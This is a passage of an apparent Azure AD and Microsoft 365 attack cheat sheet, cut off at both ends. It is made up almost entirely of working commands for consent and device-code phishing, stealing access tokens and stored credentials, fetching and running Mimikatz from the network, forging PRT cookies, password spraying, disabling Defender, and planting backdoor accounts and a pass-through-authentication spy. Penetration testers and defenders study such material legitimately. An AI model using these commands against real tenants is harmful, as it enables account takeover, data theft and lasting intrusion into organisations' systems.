our application Under support account types select \u0026ldquo;Accounts in any organizational directory (Any Azure AD directory - Multitenant)\u0026rdquo; Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is https://\u0026lt;DOMAIN/IP\u0026gt;:\u0026lt;PORT\u0026gt;/login/authorized. Click Register and save the Application ID Configure Application # Click on Certificates \u0026amp; secrets Click on New client secret then enter the Description and click on Add. Save the secret\u0026rsquo;s value. Click on API permissions \u0026gt; Add a permission Click on Microsoft Graph \u0026gt; Delegated permissions Search and select the below mentioned permissions and click on Add permission Contacts.Read Mail.Read / Mail.ReadWrite Mail.Send Notes.Read.All Mailboxsettings.ReadWrite Files.ReadWrite.All User.ReadBasic.All User.Read Setup 365-Stealer (Deprecated) # :warning: Default port for 365-Stealer phishing is 443\nRun XAMPP and start Apache Clone 365-Stealer into C:\\xampp\\htdocs\\ git clone https://github.com/AlteredSecurity/365-Stealer.git Install the requirements Python3 PHP CLI or Xampp server pip install -r requirements.txt Enable sqlite3 (Xampp \u0026gt; Apache config \u0026gt; php.ini) and restart Apache Edit C:/xampp/htdocs/yourvictims/index.php if needed Disable IP whitelisting $enableIpWhiteList = false; Go to 365-Stealer Management portal \u0026gt; Configuration (http://localhost:82/365-stealer/yourVictims) Client Id (Mandatory): This will be the Application(Client) Id of the application that we registered. Client Secret (Mandatory): Secret value from the Certificates \u0026amp; secrets tab that we created. Redirect URL (Mandatory): Specify the redirect URL that we entered during registering the App like https://\u0026lt;Domain/IP\u0026gt;/login/authorized Macros Location: Path of macro file that we want to inject. Extension in OneDrive: We can provide file extensions that we want to download from the victims account or provide * to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. Delay: Delay the request by specifying time in seconds while stealing Create a Self Signed Certificate to use HTTPS Run the application either click on the button or run this command : python 365-Stealer.py --run-app --no-ssl: disable HTTPS --port: change the default listening port --token: provide a specific token --refresh-token XXX --client-id YYY --client-secret ZZZ: use a refresh token Find the Phishing URL: go to https://\u0026lt;IP/Domain\u0026gt;:\u0026lt;Port\u0026gt; and click on Read More button or in the console. Setup Vajra # Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target\u0026rsquo;s Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra\nMitigation: Enable Do not allow user consent for applications in the \u0026ldquo;Consent and permissions menu\u0026rdquo;.\nDevice Code Phish # Requirements:\nAzure AD / Office 365 E3 Subscription Exploitation:\nImport TokenTactics: PS C:\\TokenTactics\u0026gt; Import-Module .\\TokenTactics.psd1 Request a device code for the Azure Graph API using TokenTactics: Get-AzureToken -Client Graph Replace \u0026lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS\u0026gt; in the phishing email Leave TokenTactics running in the PowerShell window and send the phishing email Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form Enjoy your Access Token \u0026amp; Refresh Token Token from Managed Identity # MSI_ENDPOINT is an alias for IDENTITY_ENDPOINT, and MSI_SECRET is an alias for IDENTITY_HEADER.\nFind IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : env\nMost of the time, you want a token for one of these resources:\nhttps://storage.azure.com https://vault.azure.net https://graph.microsoft.com https://management.azure.com Azure API via Powershell # Get access_token from IDENTITY_HEADER and IDENTITY_ENDPOINT: system('curl \u0026quot;$IDENTITY_ENDPOINT?resource=https://management.azure.com/\u0026amp;api-version=2017-09-01\u0026quot; -H secret:$IDENTITY_HEADER');.\nThen query the Azure REST API to get the subscription ID and more .\n$Token = \u0026#39;eyJ0eX..\u0026#39; $URI = \u0026#39;https://management.azure.com/subscriptions?api-version=2020-01-01\u0026#39; # $URI = \u0026#39;https://graph.microsoft.com/v1.0/applications\u0026#39; $RequestParams = @{ Method = \u0026#39;GET\u0026#39; Uri = $URI Headers = @{ \u0026#39;Authorization\u0026#39; = \u0026#34;Bearer $Token\u0026#34; } } (Invoke-RestMethod @RequestParams).value # List resources and check for runCommand privileges $URI = \u0026#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01\u0026#39; $URI = \u0026#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/\u0026lt;RG-NAME\u0026gt;/providers/Microsoft.Compute/virtualMachines/\u0026lt;RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01\u0026#39; Azure API via Python Version # IDENTITY_ENDPOINT = os.environ[\u0026#39;IDENTITY_ENDPOINT\u0026#39;] IDENTITY_HEADER = os.environ[\u0026#39;IDENTITY_HEADER\u0026#39;] print(\u0026#34;[+] Management API\u0026#34;) cmd = \u0026#39;curl \u0026#34;%s?resource=https://management.azure.com/\u0026amp;api-version=2017-09-01\u0026#34; -H secret:%s\u0026#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(\u0026#34;Access Token: \u0026#34;+json.loads(val)[\u0026#34;access_token\u0026#34;]) print(\u0026#34;ClientID/AccountID: \u0026#34;+json.loads(val)[\u0026#34;client_id\u0026#34;]) print(\u0026#34;\\r\\n[+] Graph API\u0026#34;) cmd = \u0026#39;curl \u0026#34;%s?resource=https://graph.microsoft.com/\u0026amp;api-version=2017-09-01\u0026#34; -H secret:%s\u0026#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(json.loads(val)[\u0026#34;access_token\u0026#34;]) print(\u0026#34;ClientID/AccountID: \u0026#34;+json.loads(val)[\u0026#34;client_id\u0026#34;]) or inside a Python Function:\nimport logging, os import azure.functions as func def main(req: func.HttpRequest) -\u0026gt; func.HttpResponse: logging.info(\u0026#39;Python HTTP trigger function processed a request.\u0026#39;) IDENTITY_ENDPOINT = os.environ[\u0026#39;IDENTITY_ENDPOINT\u0026#39;] IDENTITY_HEADER = os.environ[\u0026#39;IDENTITY_HEADER\u0026#39;] cmd = \u0026#39;curl \u0026#34;%s?resource=https://management.azure.com\u0026amp;apiversion=2017-09-01\u0026#34; -H secret:%s\u0026#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() return func.HttpResponse(val, status_code=200) Get Tokens # :warning: The lifetime of a Primary Refresh Token is 14 days!\n# az cli - get tokens az account get-access-token az account get-access-token --resource-type aad-graph # or Az (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token # or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT Use Tokens # Tokens contain all the claims including that for MFA and Conditional Access\nAz Powershell PS C:\\Tools\u0026gt; $token = \u0026#39;eyJ0e..\u0026#39; PS C:\\Tools\u0026gt; Connect-AzAccount -AccessToken $token -AccountId \u0026lt;ACCOUNT-ID\u0026gt; # Access Token and Graph Token PS C:\\Tools\u0026gt; $token = \u0026#39;eyJ0eX..\u0026#39; PS C:\\Tools\u0026gt; $graphaccesstoken = \u0026#39;eyJ0eX..\u0026#39; PS C:\\Tools\u0026gt; Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId \u0026lt;ACCOUNT-ID\u0026gt; PS C:\\Tools\u0026gt; Get-AzResource # ERROR: \u0026#39;this.Client.SubscriptionId\u0026#39; cannot be null. # ---\u0026gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI AzureAD Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 $AADToken = \u0026#39;eyJ0…\u0026#39; Connect-AzureAD -AadAccessToken $AADToken -TenantId \u0026lt;TENANT-ID\u0026gt; -AccountId \u0026lt;ACCOUNT-ID\u0026gt; Refresh Tokens # https://github.com/ConstantinT/Lantern Lantern.exe cookie --derivedkey \u0026lt;Key from Mimikatz\u0026gt; --context \u0026lt;Context from Mimikatz\u0026gt; --prt \u0026lt;PRT from Mimikatz\u0026gt; Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename \u0026lt;Name\u0026gt; --outpfxfile \u0026lt;Some path\u0026gt; Lantern.exe token --username \u0026lt;Username\u0026gt; --password \u0026lt;Password\u0026gt; Lantern.exe token --refreshtoken \u0026lt;RefreshToken\u0026gt; Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) https://github.com/rvrsh3ll/TokenTactics Import-Module .\\TokenTactics.psd1 CommandType Name Version Source ----------- ---- ------- ------ Function Clear-Token 0.0.1 TokenTactics Function Dump-OWAMailboxViaMSGraphApi 0.0.1 TokenTactics Function Forge-UserAgent 0.0.1 TokenTactics Function Get-AzureToken 0.0.1 TokenTactics Function Get-TenantID 0.0.1 TokenTactics Function Open-OWAMailboxInBrowser 0.0.1 TokenTactics Function Parse-JWTtoken 0.0.1 TokenTactics Function RefreshTo-AzureCoreManagementToken 0.0.1 TokenTactics Function RefreshTo-AzureManagementToken 0.0.1 TokenTactics Function RefreshTo-DODMSGraphToken 0.0.1 TokenTactics Function RefreshTo-GraphToken 0.0.1 TokenTactics Function RefreshTo-MAMToken 0.0.1 TokenTactics Function RefreshTo-MSGraphToken 0.0.1 TokenTactics Function RefreshTo-MSManageToken 0.0.1 TokenTactics Function RefreshTo-MSTeamsToken 0.0.1 TokenTactics Function RefreshTo-O365SuiteUXToken 0.0.1 TokenTactics Function RefreshTo-OfficeAppsToken 0.0.1 TokenTactics Function RefreshTo-OfficeManagementToken 0.0.1 TokenTactics Function RefreshTo-OutlookToken 0.0.1 TokenTactics Function RefreshTo-SubstrateToken 0.0.1 TokenTactics Stealing Tokens # Get-AzurePasswords Import-Module Microburst.psm1 Get-AzurePasswords Get-AzurePasswords -Verbose | Out-GridView Stealing tokens from az cli # az cli stores access tokens in clear text in accessTokens.json in the directory C:\\Users\\\u0026lt;username\u0026gt;\\.Azure azureProfile.json in the same directory contains information about subscriptions. Stealing tokens from az powershell # Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory C:\\Users\\\u0026lt;username\u0026gt;\\.Azure It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json Users can save tokens using Save-AzContext Add credentials to all Enterprise Applications # # Add secrets PS \u0026gt; . C:\\Tools\\Add-AzADAppSecret.ps1 PS \u0026gt; Add-AzADAppSecret -GraphToken $graphtoken -Verbose # Use secrets to authenticate as Service Principal PS \u0026gt; $password = ConvertTo-SecureString \u0026#39;\u0026lt;SECRET/PASSWORD\u0026gt;\u0026#39; -AsPlainText -Force PS \u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#39;\u0026lt;AppID\u0026gt;\u0026#39;, $password) PS \u0026gt; Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant \u0026#39;\u0026lt;TenantID\u0026gt;\u0026#39; Spawn SSH for Azure Web App # az webapp create-remote-connection --subscription \u0026lt;SUBSCRIPTION-ID\u0026gt; --resource-group \u0026lt;RG-NAME\u0026gt; -n \u0026lt;APP-SERVICE-NAME\u0026gt; Azure Storage Blob # Blobs - *.blob.core.windows.net File Services - *.file.core.windows.net Data Tables - *.table.core.windows.net Queues - *.queue.core.windows.net Enumerate blobs # PS \u0026gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureBlobs.ps1 PS \u0026gt; Invoke-EnumerateAzureBlobs -Base \u0026lt;SHORT DOMAIN\u0026gt; -OutputFile azureblobs.txt Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net SAS URL # Use Storage Explorer Click on Open Connect Dialog in the left menu. Select Blob container. On the Select Authentication Method page Select Shared access signature (SAS) and click on Next Copy the URL in Blob container SAS URL field. :warning: You can also use subscription(username/password) to access storage resources such as blobs and files.\nList and download blobs # PS Az\u0026gt; Get-AzResource PS Az\u0026gt; Get-AzStorageAccount -name \u0026lt;NAME\u0026gt; -ResourceGroupName \u0026lt;NAME\u0026gt; PS Az\u0026gt; Get-AzStorageContainer -Context (Get-AzStorageAccount -name \u0026lt;NAME\u0026gt; -ResourceGroupName \u0026lt;NAME\u0026gt;).context PS Az\u0026gt; Get-AzStorageBlobContent -Container \u0026lt;NAME\u0026gt; -Context (Get-AzStorageAccount -name \u0026lt;NAME\u0026gt; -ResourceGroupName \u0026lt;NAME\u0026gt;).context -Blob Runbook Automation # Create a Runbook # # Check user right for automation az extension add --upgrade -n automation az automation account list # if it doesn\u0026#39;t return anything the user is not a part of an Automation group az ad signed-in-user list-owned-objects # If the user is not part of an \u0026#34;Automation\u0026#34; group. # Add him to a custom group , e.g: \u0026#34;Automation Admins\u0026#34; Add-AzureADGroupMember -ObjectId \u0026lt;OBJID\u0026gt; -RefObjectId \u0026lt;REFOBJID\u0026gt; -Verbose # Get the role of a user on the Automation account # Contributor or higher = Can create and execute Runbooks Get-AzRoleAssignment -Scope /subscriptions/\u0026lt;ID\u0026gt;/resourceGroups/\u0026lt;RG-NAME\u0026gt;/providers/Microsoft.Automation/automationAccounts/\u0026lt;AUTOMATION-ACCOUNT\u0026gt; # List hybrid workers Get-AzAutomationHybridWorkerGroup -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; # Create a Powershell Runbook PS C:\\Tools\u0026gt; Import-AzAutomationRunbook -Name \u0026lt;RUNBOOK-NAME\u0026gt; -Path C:\\Tools\\username.ps1 -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -Type PowerShell -Force -Verbose # Publish the Runbook Publish-AzAutomationRunbook -RunbookName \u0026lt;RUNBOOK-NAME\u0026gt; -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -Verbose # Start the Runbook Start-AzAutomationRunbook -RunbookName \u0026lt;RUNBOOK-NAME\u0026gt; -RunOn Workergroup1 -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -Verbose Persistence via Automation accounts # Create a new Automation Account \u0026ldquo;Create Azure Run As account\u0026rdquo;: Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign \u0026ldquo;User Administrator\u0026rdquo; and \u0026ldquo;Subscription Owner\u0026rdquo; rights to the automation account Eventually lose your access… Trigger the webhook with a post request to create the new user $uri = \u0026#34;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\u0026#34; $AccountInfo = @(@{RequestBody=@{Username=\u0026#34;BackdoorUsername\u0026#34;;Password=\u0026#34;BackdoorPassword\u0026#34;}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body Virtual Machine RunCommand # Requirements:\nMicrosoft.Compute/virtualMachines/runCommand/action # Get Public IP of VM : query the network interface PS AzureAD\u0026gt; Get-AzVM -Name \u0026lt;RESOURCE\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; | select -ExpandProperty NetworkProfile PS AzureAD\u0026gt; Get-AzNetworkInterface -Name \u0026lt;RESOURCE368\u0026gt; PS AzureAD\u0026gt; Get-AzPublicIpAddress -Name \u0026lt;RESOURCEIP\u0026gt; # Execute Powershell script on the VM PS AzureAD\u0026gt; Invoke-AzVMRunCommand -VMName \u0026lt;RESOURCE\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -CommandId \u0026#39;RunPowerShellScript\u0026#39; -ScriptPath \u0026#39;C:\\Tools\\adduser.ps1\u0026#39; -Verbose # Connect via WinRM PS C:\\Tools\u0026gt; $password = ConvertTo-SecureString \u0026#39;\u0026lt;PASSWORD\u0026gt;\u0026#39; -AsPlainText -Force PS C:\\Tools\u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#39;username\u0026#39;, $Password) PS C:\\Tools\u0026gt; $sess = New-PSSession -ComputerName \u0026lt;IP\u0026gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) PS C:\\Tools\u0026gt; Enter-PSSession $sess Allow anyone with \u0026ldquo;Contributor\u0026rdquo; rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\\System\n# List available VMs PS C:\\\u0026gt; Get-AzureRmVM -status | where {$_.PowerState -EQ \u0026#34;VM running\u0026#34;} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test # Execute Powershell script on the VM PS C:\\\u0026gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1\nImport-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt KeyVault Secrets # # keyvault access token curl \u0026#34;$IDENTITY_ENDPOINT?resource=https://vault.azure.net\u0026amp;apiversion=2017-09-01\u0026#34; -H secret:$IDENTITY_HEADER curl \u0026#34;$IDENTITY_ENDPOINT?resource=https://management.azure.com\u0026amp;apiversion=2017-09-01\u0026#34; -H secret:$IDENTITY_HEADER # connect PS\u0026gt; $token = \u0026#39;eyJ0..\u0026#39; PS\u0026gt; $keyvaulttoken = \u0026#39;eyJ0..\u0026#39; PS Az\u0026gt; Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken # query the vault and the secrets PS Az\u0026gt; Get-AzKeyVault PS Az\u0026gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault PS Az\u0026gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText Pass The PRT # MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).\n# Run mimikatz to obtain the PRT PS\u0026gt; iex (New-Object Net.Webclient).downloadstring(\u0026#34;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1\u0026#34;) PS\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::cloudap\u0026#34;\u0026#39; # Copy the PRT and KeyValue Mimikatz\u0026gt; privilege::debug Mimikatz\u0026gt; token::elevate Mimikatz\u0026gt; dpapi::cloudapkd /keyvalue:\u0026lt;KeyValue\u0026gt; /unprotect # Copy the Context, ClearKey and DerivedKey Mimikatz\u0026gt; dpapi::cloudapkd /context:\u0026lt;Context\u0026gt; /derivedkey:\u0026lt;DerivedKey\u0026gt; /Prt:\u0026lt;PRT\u0026gt; # Generate a JWT PS\u0026gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals\u0026gt; $PRT_OF_USER = \u0026#39;...\u0026#39; PS AADInternals\u0026gt; while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \u0026#34;=\u0026#34;} PS AADInternals\u0026gt; $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER)) PS AADInternals\u0026gt; $ClearKey = \u0026#34;XXYYZZ...\u0026#34; PS AADInternals\u0026gt; $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace \u0026#39;..\u0026#39;, \u0026#39;0x$\u0026amp;,\u0026#39; -split \u0026#39;,\u0026#39; -ne \u0026#39;\u0026#39;)) PS AADInternals\u0026gt; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce eyJ0eXAiOiJKV1QiL... The \u0026lt;Signed JWT\u0026gt; (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf. Edit the Chrome cookie (F12) -\u0026gt; Application -\u0026gt; Cookies with the values:\nName: x-ms-RefreshTokenCredential Value: \u0026lt;Signed JWT\u0026gt; HttpOnly: √ :warning: Mark the cookie with the flags HTTPOnly and Secure.\nPass The Certificate # Copy-Item -ToSession $jumpvm -Path C:\\Tools\\PrtToCertmaster.zip -Destination C:\\Users\\Username\\Documents\\username –Verbose Expand-Archive -Path C:\\Users\\Username\\Documents\\username\\PrtToCert-master.zip -DestinationPath C:\\Users\\Username\\Documents\\username\\PrtToCert # Require the PRT, TenantID, Context and DerivedKey \u0026amp; \u0026#39;C:\\Program Files\\Python39\\python.exe\u0026#39; C:\\Users\\Username\\Documents\\username\\PrtToCert\\RequestCert.py --tenantId \u0026lt;TENANT-ID\u0026gt; --prt \u0026lt;PRT\u0026gt; --userName \u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com --hexCtx \u0026lt;HEX-CONTEXT\u0026gt; --hexDerivedKey \u0026lt;HEX-DERIVED-KEY\u0026gt; # PFX saved with the name \u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com.pfx and password AzureADCert Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine\nhttps://github.com/morRubin/AzureADJoinedMachinePTC\nMain.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP Main.py --usercert \u0026#34;admin.pfx\u0026#34; --certpass password --remoteip 10.10.10.10 python Main.py --usercert C:\\Users\\Username\\Documents\\username\\\u0026lt;USERNAME\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com.pfx -- certpass AzureADCert --remoteip 10.10.10.10 --command \u0026#34;cmd.exe /c net user username Password@123 /add /Y \u0026amp;\u0026amp; net localgroup administrators username /add\u0026#34; Intunes Administration # Requirements:\nGlobal Administrator or Intune Administrator Privilege : Get-AzureADGroup -Filter \u0026quot;DisplayName eq 'Intune Administrators'\u0026quot; Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT Go to Devices -\u0026gt; All Devices to check devices enrolled to Intune Go to Scripts and click on Add for Windows 10. Add a Powershell script Specify Add all users and Add all devices in the Assignments page. :warning: It will take up to one hour before you script is executed !\nDynamic Group Membership # Get groups that allow Dynamic membership: Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}\nRule example : (user.otherMails -any (_ -contains \u0026quot;vendor\u0026quot;)) -and (user.userType -eq \u0026quot;guest\u0026quot;) Rule description: Any Guest user whose secondary email contains the string \u0026lsquo;vendor\u0026rsquo; will be added to the group\nOpen user\u0026rsquo;s profile, click on Manage Click on Resend invite and to get an invitation URL Set the secondary email PS\u0026gt; Set-AzureADUser -ObjectId \u0026lt;OBJECT-ID\u0026gt; -OtherMails \u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -Verbose Administrative Unit # Administrative Unit can reset password of another user\nPS AzureAD\u0026gt; Get-AzureADMSAdministrativeUnit -Id \u0026lt;ID\u0026gt; PS AzureAD\u0026gt; Get-AzureADMSAdministrativeUnitMember -Id \u0026lt;ID\u0026gt; PS AzureAD\u0026gt; Get-AzureADMSScopedRoleMembership -Id \u0026lt;ID\u0026gt; | fl PS AzureAD\u0026gt; Get-AzureADDirectoryRole -ObjectId \u0026lt;RoleId\u0026gt; PS AzureAD\u0026gt; Get-AzureADUser -ObjectId \u0026lt;RoleMemberInfo.Id\u0026gt; | fl PS C:\\Tools\u0026gt; $password = \u0026#34;Password\u0026#34; | ConvertToSecureString -AsPlainText -Force PS C:\\Tools\u0026gt; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq \u0026#34;\u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026#34;}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose Deployment Template # PS Az\u0026gt; Get-AzResourceGroup PS Az\u0026gt; Get-AzResourceGroupDeployment -ResourceGroupName SAP # Export PS Az\u0026gt; Save-AzResourceGroupDeploymentTemplate -ResourceGroupName \u0026lt;RESOURCE GROUP\u0026gt; -DeploymentName \u0026lt;DEPLOYMENT NAME\u0026gt; cat \u0026lt;DEPLOYMENT NAME\u0026gt;.json # search for hardcoded password cat \u0026lt;PATH TO .json FILE\u0026gt; | Select-String password Application Proxy # # Enumerate application that have Proxy PS C:\\Tools\u0026gt; Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}} PS C:\\Tools\u0026gt; Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq \u0026#34;Finance Management System\u0026#34;} PS C:\\Tools\u0026gt; . C:\\Tools\\GetApplicationProxyAssignedUsersAndGroups.ps1 PS C:\\Tools\u0026gt; Get-ApplicationProxyAssignedUsersAndGroups -ObjectId \u0026lt;OBJECT-ID\u0026gt; Conditional Access # Bypassing conditional access by copying User-Agent (Chrome Dev Tool \u0026gt; Select iPad Pro, etc) Bypassing conditional access by faking device compliance # AAD Internals - Making your device compliant # Get an access token for AAD join and save to cache Get-AADIntAccessTokenForAADJoin -SaveToCache # Join the device to Azure AD Join-AADIntDeviceToAzureAD -DeviceName \u0026#34;SixByFour\u0026#34; -DeviceType \u0026#34;Commodore\u0026#34; -OSVersion \u0026#34;C64\u0026#34; # Marking device compliant - option 1: Registering device to Intune # Get an access token for Intune MDM and save to cache (prompts for credentials) Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache # Join the device to Intune Join-AADIntDeviceToIntune -DeviceName \u0026#34;SixByFour\u0026#34; # Start the call back Start-AADIntDeviceIntuneCallback -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \u0026#34;SixByFour\u0026#34; Azure AD # With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.\nAuthenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy! Azure AD vs Active Directory # Active Directory Azure AD LDAP REST API\u0026rsquo;S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO\u0026rsquo;s Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests Password Hash Syncronization (PHS)\nPasswords from on-premise AD are sent to the cloud Use replication via a service account created by AD Connect Pass Through Authentication (PTA)\nPossible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text Connect Windows Server AD to Azure AD using Federation Server (ADFS)\nDir-Sync : Handled by on-premise Windows Server AD, sync username/password Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg\u0026name=large\nWorkplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg\u0026name=large\nHybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg\u0026name=large\nWorkplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg\u0026name=large\nPassword Spray # Default lockout policy of 10 failed attempts, locking out an account for 60 seconds\ngit clone https://github.com/dafthack/MSOLSpray Import-Module .\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format \u0026#34;user@domain.com\u0026#34; # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from. Convert GUID to SID # The user\u0026rsquo;s AAD id is translated to SID by concatenating \u0026quot;S-1–12–1-\u0026quot; to the decimal representation of each section of the AAD Id.\nGUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92–810d-b0dce30b6c82 is S-1–12–1–1789435595–1301421967–3702525313–2188119011\nAzure AD Connect # Check if Azure AD Connect is installed : Get-ADSyncConnector\nFor PHS, we can extract the credentials For PTA, we can install the agent For Federation, we can extract the certificate from ADFS server using DA PS \u0026gt; Set-MpPreference -DisableRealtimeMonitoring $true PS \u0026gt; Copy-Item -ToSession $adcnct -Path C:\\Tools\\AADInternals.0.4.5.zip -Destination C:\\Users\\Administrator\\Documents PS \u0026gt; Expand-Archive C:\\Users\\Administrator\\Documents\\AADInternals.0.4.5.zip -DestinationPath C:\\Users\\Administrator\\Documents\\AADInternals PS \u0026gt; Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1 PS \u0026gt; Get-AADIntSyncCredentials # Get Token for SYNC account and reset on-prem admin password PS \u0026gt; $passwd = ConvertToSecureString \u0026#39;password\u0026#39; -AsPlainText -Force PS \u0026gt; $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;\u0026lt;Username\u0026gt;@\u0026lt;TenantName\u0026gt;.onmicrosoft.com\u0026#34;, $passwd) PS \u0026gt; GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache PS \u0026gt; Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId PS \u0026gt; Set-AADIntUserPassword -SourceAnchor \u0026#34;\u0026lt;IMMUTABLE-ID\u0026gt;\u0026#34; -Password \u0026#34;Password\u0026#34; -Verbose Check if PTA is installed : Get-Command -Module PassthroughAuthPSModule Install a PTA Backdoor PS AADInternals\u0026gt; Install-AADIntPTASpy PS AADInternals\u0026gt; 